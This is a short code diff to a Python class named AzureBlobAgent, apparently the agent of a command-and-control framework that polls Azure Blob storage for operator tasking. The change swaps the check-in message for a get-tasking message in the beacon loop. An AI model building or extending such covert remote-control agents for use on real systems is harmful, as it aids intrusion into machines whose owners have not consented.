@@ -240,7 +240,7 @@ class AzureBlobAgent:
         while True:
             try:
                 # Get tasking
-                data = self.postMessageAndRetrieveResponseBlob(self.build_checkin_message())
+                data = self.postMessageAndRetrieveResponseBlob(self.build_get_tasking_message())
                 response_data = None
                 if "tasks" in data:
                     print("{*] got tasks")
